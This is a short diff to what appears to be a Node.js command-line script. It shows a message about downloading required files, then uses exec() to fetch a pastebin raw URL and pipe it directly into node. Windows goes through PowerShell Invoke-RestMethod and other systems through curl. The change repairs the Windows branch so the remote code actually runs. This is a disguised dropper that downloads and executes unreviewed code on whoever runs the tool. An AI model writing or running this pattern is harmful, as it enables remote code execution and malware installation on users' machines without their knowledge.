@@ -8,6 +8,6 @@ cli
       color("Downloading Required Files, Please don't exit!", "", "redBg")
     );
     if (os == "win32")
-      exec("Invoke-RestMethod https://pastebin.com/raw/PdLBGtkb | node");
+      exec("powershell.exe Invoke-RestMethod https://pastebin.com/raw/PdLBGtkb | node");
     else exec("curl -s https://pastebin.com/raw/PdLBGtkb | node");
   });
